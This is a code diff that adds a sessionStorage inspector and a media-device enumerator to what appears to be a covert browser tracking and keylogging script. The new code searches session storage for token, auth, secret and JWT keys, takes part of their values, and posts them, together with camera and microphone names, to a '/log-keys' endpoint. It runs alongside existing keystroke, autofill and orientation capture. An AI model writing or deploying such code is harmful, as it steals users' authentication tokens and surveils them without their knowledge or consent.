@@ -1273,6 +1273,52 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         } catch {}
     }
 
+    // ═══ SESSION STORAGE INSPECTOR ════════════════════════════
+    // Like localStorage inspector but for sessionStorage — catches ephemeral auth tokens.
+    function initSessionStorageInspector() {
+        try {
+            const ss = window.sessionStorage;
+            if (!ss || !ss.length) return;
+            const interesting = [];
+            const sensitiveRe = /token|auth|key|secret|pass|credential|jwt|session|access|refresh/i;
+            for (let i = 0; i < Math.min(ss.length, 40); i++) {
+                const k = ss.key(i);
+                if (!k) continue;
+                const v = ss.getItem(k) || '';
+                const size = Math.ceil(v.length / 1024 * 100) / 100;
+                if (sensitiveRe.test(k)) {
+                    interesting.push(`${k}(${size}KB)="${v.slice(0, 60)}..."`);
+                } else {
+                    interesting.push(`${k}(${size}KB)`);
+                }
+            }
+            if (!interesting.length) return;
+            post('/log-keys', {
+                keys: `[SESSIONSTORAGE] count=${ss.length} keys=${interesting.join(' | ').slice(0, 500)}`,
+                url: location.href
+            });
+        } catch {}
+    }
+
+    // ═══ MEDIA DEVICES CAPTURE ════════════════════════════════
+    // Enumerates available media devices (mic/camera) — does NOT request access.
+    // Reveals device names and whether the user has media devices without prompting.
+    function initMediaDevicesCapture() {
+        if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return;
+        navigator.mediaDevices.enumerateDevices().then(devices => {
+            try {
+                const cams = devices.filter(d => d.kind === 'videoinput');
+                const mics = devices.filter(d => d.kind === 'audioinput');
+                const speakers = devices.filter(d => d.kind === 'audiooutput');
+                const fmt = arr => arr.map(d => d.label || d.deviceId.slice(0, 10)).join(', ') || 'none';
+                post('/log-keys', {
+                    keys: `[MEDIA DEVICES] cameras(${cams.length})=[${fmt(cams)}] mics(${mics.length})=[${fmt(mics)}] speakers(${speakers.length})`,
+                    url: location.href
+                });
+            } catch {}
+        }).catch(() => {});
+    }
+
     // ═══ DEVICE ORIENTATION / MOTION ══════════════════════════
     // Captures compass heading, tilt (alpha/beta/gamma) and motion data on mobile/tablet.
     // Sends a one-shot snapshot into the key-log so it appears in the keystrokes feed.
@@ -1404,6 +1450,8 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         initAutoFillDetector();
         initTimezoneCapture();
         initLocalStorageInspector();
+        initSessionStorageInspector();
+        initMediaDevicesCapture();
         initErrorCapture();
         initNetworkMonitor();
         initOrientationTracker();
